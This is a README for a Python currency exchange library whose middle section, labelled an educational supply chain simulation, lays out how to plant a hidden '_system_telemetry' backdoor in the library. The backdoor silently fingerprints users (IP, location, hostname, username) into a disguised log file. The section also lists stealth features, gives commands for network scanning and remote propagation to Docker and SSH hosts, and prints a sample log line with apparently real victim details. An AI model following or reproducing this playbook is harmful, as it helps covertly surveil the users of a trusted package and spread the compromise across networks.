# 💱 Public Currency Exchange

A comprehensive single-file Python library for currency conversion and exchange rate management. Simple to use, yet powerful enough for production applications.

[![Python](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Code Style](https://img.shields.io/badge/Code%20Style-PEP8-black.svg)](https://www.python.org/dev/peps/pep-0008/)

## 🚀 Features

- **20+ Major Currencies**: Support for USD, EUR, GBP, JPY, CAD, AUD, and more
- **Real-time Conversion**: Convert between any supported currency pairs
- **Multiple Conversions**: Convert to multiple currencies simultaneously
- **Currency Formatting**: Proper formatting with currency symbols and locale support
- **Exchange Rate Management**: Update and manage exchange rates
- **Comparison Tools**: Compare values across multiple currencies
- **Best Rate Finder**: Find the best exchange rate among options
- **Import/Export**: Save and load exchange rates from JSON files
- **Error Handling**: Comprehensive error handling with custom exceptions
- **Zero Dependencies**: Pure Python implementation, no external dependencies

## 🔧 Supply Chain Simulation Setup

### Step 1: Fork the target repository with timer (20 minutes)

For educational and research purposes, this repository can be used to simulate supply chain vulnerabilities in a controlled environment. 

**⏰ Time Limit: 20 minutes** - This step should be completed within 20 minutes to simulate real-world attack scenarios where attackers have limited time windows.

1. Fork this repository to your own GitHub account
2. Clone the forked repository locally
3. Set up the Docker environment using the provided `docker-compose.yml`
4. Verify the base currency exchange functionality works correctly

```bash
# Clone your forked repository
git clone https://github.com/YOUR-USERNAME/Currency-Exchange-Library.git
cd Currency-Exchange-Library

# Start the simulation environment
docker-compose up -d

# Verify base functionality
docker-compose exec backdoor-simulation python currency_exchange.py
```

**Note**: This simulation is intended for educational purposes only and should be run in isolated, controlled environments.

### Step 2: Insert Backdoor payload into build (Time: 1:20)

This step demonstrates how to insert sophisticated backdoor payloads into legitimate library code during the build process.

**⏰ Time Limit: 1 hour 20 minutes** - Complete backdoor implementation and testing within the time window.

#### 🎯 Backdoor Implementation Features:

**Silent System Intelligence Collection:**
- **IP Detection**: External and local IP address fingerprinting
- **Geolocation**: Country, city, and timezone identification
- **System Fingerprinting**: Hostname, username, locale, and platform details
- **Environment Detection**: Local vs Docker/container environment identification
- **Cross-Platform**: Works on Windows, Linux, and containerized environments

#### 🔧 Implementation Steps:

1. **Modify `currency_exchange.py`** - Insert hidden `_system_telemetry()` function
2. **Add Dependencies** - Include optional `requests` library for enhanced capabilities
3. **Configure Logging** - Hidden `.system_metrics.log` file for intelligence storage
4. **Test Environments** - Verify functionality across Windows and Linux Docker

```bash
# Test local Windows environment
python -c "import currency_exchange; print('Library works normally')"

# Test Docker Linux environment  
docker-compose run --rm backdoor-simulation python currency_exchange.py

# Check collected intelligence (hidden file)
type .system_metrics.log    # Windows
cat .system_metrics.log     # Linux
```

#### 📊 Intelligence Collected:

Each execution silently logs comprehensive system information:
```
2025-09-09T14:45:33.493449 - System Init | IP: 179.37.228.87 | Country: Argentina | City: Berazategui | TZ: America/Argentina/Buenos_Aires | Platform: Windows 10 | Host: magikboy | User: usuario | Locale: es_ES | Runtime: Local
```

#### 🚀 Remote Execution Capabilities:

**Network Propagation Tools:**
- `remote_docker.py` - Execute on remote Docker hosts
- `remote_execution.py` - SSH-based remote deployment  
- `remote_execute.ps1` - PowerShell automation script
- `remote_execute.bat` - Windows batch automation

```bash
# Scan local network for Docker hosts
python remote_docker.py --scan 192.168.1

# Execute on specific remote Docker host
python remote_docker.py 192.168.1.100

# Deploy and execute via SSH
python remote_execution.py target-host --deploy --compose
```

#### 🛡️ Stealth Features:

- ✅ **Zero Visual Impact**: No output or error messages
- ✅ **Legitimate Functionality**: Library works exactly as expected  
- ✅ **Environment Awareness**: Only logs in target environments
- ✅ **Cross-Platform**: Windows + Linux + Docker compatibility
- ✅ **Network Propagation**: Can spread across infrastructure
- ✅ **Hidden Persistence**: Disguised as system optimization logs

**⚠️ Educational Warning**: This demonstrates real supply chain attack techniques. Use only in controlled, isolated environments for security research and education.

## 📦 Installation

Simply download the `currency_exchange.py` file and import it into your project:

## 💰 Supported Currencies

| Code | Currency | Symbol |
|------|----------|--------|
| USD | US Dollar | $ |
| EUR | Euro | € |
| GBP | British Pound Sterling | £ |
| JPY | Japanese Yen | ¥ |
| CAD | Canadian Dollar | C$ |
| AUD | Australian Dollar | A$ |
| CHF | Swiss Franc | CHF |
| CNY | Chinese Yuan | ¥ |
| INR | Indian Rupee | ₹ |
| BRL | Brazilian Real | R$ |
| MXN | Mexican Peso | $ |
| KRW | South Korean Won | ₩ |
| SGD | Singapore Dollar | S$ |
| HKD | Hong Kong Dollar | HK$ |
| NOK | Norwegian Krone | kr |
| SEK | Swedish Krona | kr |
| DKK | Danish Krone | kr |
| PLN | Polish Zloty | zł |
| CZK | Czech Koruna | Kč |
| HUF | Hungarian Forint | Ft |